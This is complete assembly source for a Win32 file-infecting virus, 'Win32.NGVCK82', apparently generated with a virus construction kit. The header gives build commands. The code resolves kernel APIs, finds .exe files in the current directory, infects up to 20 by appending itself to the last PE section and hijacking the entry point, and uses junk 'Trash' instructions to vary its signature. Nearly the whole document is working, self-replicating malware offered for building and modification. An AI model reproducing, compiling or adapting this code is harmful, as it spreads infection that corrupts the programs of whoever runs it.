              
;
;
; Win32.NGVCK82 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK82
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 26
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov ecx, dword ptr [esp-4]
                                        ; mov ebp, ecx
 mov ebp, ecx
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ecx

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov eax, offset WFD_szFileName
 add eax, ebp


 xor edx, 94209262d                     ; Trash
 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 sub eax, 1
 add eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [edi+3Ch], 0h
 je Notagoodfile
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp eax, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 or ebx, 21221135d                      ; Trash
 add eax, edi
 sal ecx, 9d                            ; Trash
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
                                        ; clear ebx
 mov ebx, 43702d
 sub ebx, 43702d
                                        ; add ebx, 1
 add ebx, 1d
 sub ebx, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov cx, word ptr [eax+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [eax+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop ecx

 mov dword ptr [ebp+retBase], ecx

 push dword ptr [ebp+OldEIP]
 pop edx

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edx


                                        ; get Kernel by using hardcoded values
 mov ebx, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov ebx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov ebx, 077f00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear edx
 xor edx, edx

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[edx]
 mov edx, offset GetKernel32Exception
 add edx, ebp

 push edx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz GetKernel32NotFound
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je CheckPE
 add ecx, 99466826d                     ; Trash

GK2:
                                        ; mov edx, 65536
 mov edx, ( 65536d + 35d )
 sub edx, 35d
 sub ebx, edx
 adc ecx, 42015908d                     ; Trash
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ebx, 60
 add ebx, 60d
 mov esi, [ebx]
 sub ebx, 60d
 neg ebx
 sub esi, ebx
 neg ebx
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add esi, 22
 inc esi
 add esi, 21d
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [esi]
 and dx, 0F000h
 cmp dx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 sub esi, 22d


KernelFound:
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], ebx
 push esi
 pop dword ptr [ebp+KernelPE]

                                        ; clear ecx
 push 0
 pop ecx

 pop dword ptr fs:[ecx]
 pop ecx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear eax
 mov eax, -9015d
 add eax, 9015d

 mov ebx, dword ptr fs:[eax]
 mov esp, dword ptr [ebx]
GetKernel32NotFound:
                                        ; clear edx
 push 0
 pop edx

 pop dword ptr fs:[edx]
 pop ecx
 popad
 stc
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+OldEIP]

 sal eax, 13d                           ; Trash
 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edx

                                        ; mov ebx, -1
 mov ebx, -1d
 and ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 dec ebp
 add ebp, 1
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]
 xchg eax, esi

 push esi
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]

 push ecx
 or ebx, ecx                            ; Trash
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, 0
 add edx, 276d
 mov esi, offset WFD_szFileName
 add esi, ebp


ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec edx
 jnz ClearOldData2
 popad
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, 16006d
 sub edx, 16006d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 adc dword ptr [ebp+Trash1], 788732     ; Trash
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edi
 mov edi, 0
 xor edi, dword ptr [ebp+FindHandle]
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;                  [ ///// * Data * \\\\\ ]

Data:
 counter     dw 0h
 MapAddress  dd 0h
 MapHandle   dd 0h
 OldEIP      dd 0h

 APIOffsets:
 XGetFileAttributesA    dd 0h
 XSetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h

 NTableVA    dd 0h
 OTableVA    dd 0h
 Attributes  dd 0h
 TempApisearch1 dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 AlignReg1   dd 0h
 KernelMZ    dd 0h
 K32Trys     dd 0h
 ATableVA    dd 0h
 NewSize     dd 0h
 TempAPI     dd 0h
 InfCounter  dd 0h
 Trash1      dd 0h
 FindHandle  dd 0h
 NewEIP      dd 0h
 db 'Win32.NGVCK82 by SnakeByte',0
 AlignReg2   dd 0h
 KernelPE    dd 0h
 filemask    db '*.Exe',0
 FileHandle  dd 0h
 OldBase     dd 400000h

 APINames:
 db 'GetFileAttributesA', 0
 db 'SetFileAttributesA', 0
 db 'CreateFileA', 0
 db 'FindFirstFileA', 0
 db 'UnmapViewOfFile', 0
 db 'FindNextFileA', 0
 db 'MapViewOfFile', 0
 db 'CreateFileMappingA', 0
 db 'FindClose', 0
 db 'CloseHandle', 0





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 mov edi, ebp
 add edi, offset WFD_szFileName

 push edi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 xor dword ptr [ebp+Trash1], 593278     ; Trash
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop edx
 sub eax, 1
 add eax, 1
 jz CloseFile
 push edx
 add ecx, eax                           ; Trash
 push 0
 push 0
                                        ; mov eax, 2
 mov eax, ( 2d xor 38d )
 xor eax, 38d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 add eax, -1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edi
 mov edi, 0
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [edi+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
                                        ; get NTableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; add ebx, 4
 dec ebx
 add dword ptr [ebp+Trash1], 680730     ; Trash
 add ebx, 5d
                                        ; get OTableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; mov ebx, edx
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, edx
                                        ; mov edi, ebx
                                        ; clear edi
 xor edi, edi
 add edi, ebx
 mov dword ptr [ebp+TempApisearch1], eax
 push edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [edi]
 cmp ch, byte ptr [esi]
 jne ApiNotFound
 sub eax, 1
 or eax, eax
 jz FoundApi1
                                        ; add edi, 1
 add edi, 1d
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop edi
 pop ebx
                                        ; mov eax, -1
 mov eax, ( -1d xor 37d )
 xor eax, 37d
 and eax, dword ptr [ebp+TempApisearch1]
                                        ; add ebx, 4
 add ebx, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
                                        ; clear ecx
 sub ecx, ecx
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop edx
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [edx]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ecx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, [esi+3Ch]
 add ecx, esi
                                        ; get File Alignment
 mov ebx, [ecx+3Ch]
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ebx
 add ecx, VirusSize
 push ecx
 pop dword ptr [ebp+AlignReg1]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 and esi, 0
 add esi, edx
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
 add edx, ebx
                                        ; add edx, 120
 add edx, 120d
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [esi+74h]
 shl ecx, 3
 add edx, ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ebx
 mov eax, [edx+10h]
                                        ; mov ebx, eax
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, eax
 add eax, [edx+14h]
 push eax
 push ebx
 pop ecx
 add ecx, [edx+0Ch]
 mov dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 mov ecx, [edx+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [edx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], ecx
 mov ecx, dword ptr [edx+0Ch]
 add ecx, dword ptr [edx+10h]
 mov dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize
 lea ecx, [ebp+Virus]
 xchg esi, ecx


AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+InfCounter]
 sub eax, 1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 sub ecx, eax                           ; Trash
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 mov edx, 34336d
 sub edx, 34336d
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 lea esi, [ebp+APINames]
 ror ebx, 14d                           ; Trash

 lea ebx, [ebp+APIOffsets]
 xchg ebx, ecx


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 push esi
 pop eax
APINameDetect:                          ; calculate the lenght of the names
 add eax, 1d
 cmp byte ptr [eax], 0
 jne APINameDetect

 sub eax, esi
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; esi points to the Name
                                        ; ecx points to the offset

 call SearchAPI1
 push esi
 add dword ptr [esp], eax
 pop esi
                                        ; add esi, 1
 inc esi
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], 0
 add dword ptr [ecx], ebx
                                        ; add ecx, 4
 add ecx, 4d
 sub edx, 1
 jnz GetApisLoop
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

